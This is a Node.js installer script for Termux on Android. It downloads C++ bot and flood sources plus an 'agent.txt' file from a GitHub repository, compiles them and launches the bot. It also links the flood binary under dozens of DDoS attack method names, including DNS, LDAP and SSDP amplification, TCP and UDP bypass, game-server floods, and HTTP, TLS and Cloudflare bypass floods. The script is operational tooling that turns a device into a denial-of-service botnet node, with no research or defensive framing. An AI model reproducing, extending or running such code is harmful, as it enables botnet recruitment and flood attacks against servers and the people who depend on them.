/**
 * Bot Setup Script for Termux (Android)
 * Automatically checks for C/C++ compiler, downloads sources & agent.txt,
 * compiles natively for Termux architecture (ARM64/ARM32), creates method symlinks, and launches the bot.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const SOURCE_FILES = [
    { url: `${REPO_BASE}/bots/bot.cpp`, filename: 'bot.cpp' },
    { url: `${REPO_BASE}/bots/flood.cpp`, filename: 'flood.cpp' },
    { url: `${REPO_BASE}/bots/http.cpp`, filename: 'http.cpp' },
    { url: `${REPO_BASE}/bots/https.cpp`, filename: 'https.cpp' },
    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt' }
];

const METHODS = [
    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
    'subnet', 'icmp',
    'http', 'https', 'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
];

function downloadHttp(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return downloadHttp(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

function downloadWgetOrCurl(url, destPath) {
    try {
        execSync(`wget -q -O "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    try {
        execSync(`curl -s -L -o "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    return false;
}

async function downloadFile(url, destPath) {
    try {
        await downloadHttp(url, destPath);
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return;
    } catch (_) {}

    const ok = downloadWgetOrCurl(url, destPath);
    if (!ok) {
        throw new Error(`Failed to download from ${url}`);
    }
}

function checkAndInstallDependencies() {
    console.log('[*] Checking compiler dependencies in Termux...');
    let hasCompiler = false;

    try {
        execSync('which clang++ || which g++', { stdio: 'ignore' });
        hasCompiler = true;
    } catch (_) {
        hasCompiler = false;
    }

    if (!hasCompiler) {
        console.log('[*] Compiler not found. Installing clang & openssl-tool via pkg...');
        try {
            execSync('pkg install -y clang make openssl-tool openssl', { stdio: 'inherit' });
        } catch (err) {
            console.error(`[!] Failed to auto-install compiler: ${err.message}`);
            console.log('[!] Please run manually: pkg update && pkg install -y clang make openssl');
        }
    }
}

function compileSources(targetDir) {
    const compiler = 'clang++';
    console.log('[*] Compiling bot binaries for Termux architecture...');

    const targets = [
        { src: 'bot.cpp', bin: 'bot', flags: '-O2' },
        { src: 'flood.cpp', bin: 'flood', flags: '-O2 -pthread -lssl -lcrypto' },
        { src: 'http.cpp', bin: 'http', flags: '-O2 -pthread' },
        { src: 'https.cpp', bin: 'https', flags: '-O2 -pthread -lssl -lcrypto' }
    ];

    for (const t of targets) {
        const srcPath = path.join(targetDir, t.src);
        const binPath = path.join(targetDir, t.bin);

        if (fs.existsSync(srcPath)) {
            process.stdout.write(`[*] Compiling ${t.bin}... `);
            try {
                execSync(`${compiler} ${t.flags} -o "${binPath}" "${srcPath}"`, {
                    cwd: targetDir,
                    stdio: 'pipe'
                });
                fs.chmodSync(binPath, 0o755);
                console.log('OK');
            } catch (err) {
                console.log('FAILED');
                console.error(`[!] Compilation error for ${t.bin}: ${err.message}`);
            }
        }
    }

    const floodPath = path.join(targetDir, 'flood');
    if (fs.existsSync(floodPath)) {
        console.log('[*] Setting up method symlinks in Termux...');
        for (const m of METHODS) {
            const linkPath = path.join(targetDir, m);
            try {
                if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
                fs.symlinkSync('flood', linkPath);
            } catch (_) {
                try {
                    fs.copyFileSync(floodPath, linkPath);
                    fs.chmodSync(linkPath, 0o755);
                } catch (_) {}
            }
        }
        console.log('[+] All method links ready.');
    }
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Termux Bot in: ${targetDir}`);

    checkAndInstallDependencies();

    for (const item of SOURCE_FILES) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            const nocacheUrl = `${item.url}?t=${Date.now()}`;
            await downloadFile(nocacheUrl, dest);
            console.log('OK');
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Error downloading ${item.filename}: ${err.message}`);
        }
    }

    compileSources(targetDir);

    const botBinPath = path.join(targetDir, 'bot');
    if (fs.existsSync(botBinPath)) {
        console.log('[+] Launching Termux Bot process...');
        const child = spawn(botBinPath, [], {
            cwd: targetDir,
            stdio: ['inherit', 'pipe', 'pipe']
        });

        child.stdout.on('data', (data) => {
            process.stdout.write(data);
        });

        child.stderr.on('data', (data) => {
            process.stderr.write(data);
        });

        child.on('error', (err) => {
            console.error(`[!] Failed to start bot process: ${err.message}`);
            process.exit(1);
        });

        child.on('exit', (code, signal) => {
            console.log(`[!] Bot process exited with code ${code} (signal: ${signal})`);
            process.exit(code || 0);
        });

        process.on('SIGINT', () => child.kill('SIGINT'));
        process.on('SIGTERM', () => child.kill('SIGTERM'));
    } else {
        console.error('[-] Bot binary not found / compilation failed.');
        process.exit(1);
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
